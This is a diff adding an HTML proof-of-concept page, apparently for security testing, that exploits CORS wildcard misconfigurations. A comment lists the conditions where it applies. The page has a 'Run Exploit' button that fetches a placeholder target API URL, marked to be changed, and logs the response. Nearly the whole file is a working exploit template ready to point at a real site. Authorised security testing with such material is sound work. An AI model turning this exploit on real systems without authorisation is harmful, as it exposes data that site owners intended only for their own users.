@@ -1,0 +1,28 @@
+<!doctype html>
+<!--
+CORS PoC: Non-credentialed wildcard access.
+
+Useful when:
+- Access-Control-Allow-Origin: *
+- Data intended for same-origin users is publicly readable
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS Wildcard</title>
+</head>
+<body>
+
+<button id="run">Run Exploit</button>
+
+<script>
+  const TARGET_URL = "https://vulnerable-site.example/api/endpoint"; // change
+
+  document.getElementById("run").onclick = async () => {
+    const response = await fetch(TARGET_URL);
+    console.log("RESPONSE:", await response.text());
+  };
+</script>
+
+</body>
+</html>
